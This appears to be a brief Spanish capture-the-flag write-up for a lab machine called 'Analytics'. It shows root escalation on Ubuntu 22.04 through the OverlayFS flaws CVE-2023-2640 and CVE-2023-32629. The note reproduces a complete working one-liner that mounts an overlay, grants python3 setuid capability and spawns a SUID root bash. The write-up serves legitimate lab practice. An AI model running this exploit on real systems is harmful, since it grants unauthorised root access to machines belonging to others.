#CVE-2023-2640-CVE-2023-32629

-----

Vemos que version de kernel esta corriendo con [[uname]] y el comando `uname -r` y para ver si el sistema es de 32 o 64 bits usamos `uname -m`

![[Analytics22.png]]

![[Analytics23.png]]
Y nos da que tenemos un *ubuntu 22.04* de 32 bits

Buscando informacion sobre esta version encontramos los [[CVE-2023-2640-CVE-2023-32629]]. Y encontramos el [repositorio de g1vi](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main) que nos muestra el payload que tenemos que poner para hacer la explotacion

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

![[Analytics24.png]]
Ya somos root y podemos catear las flags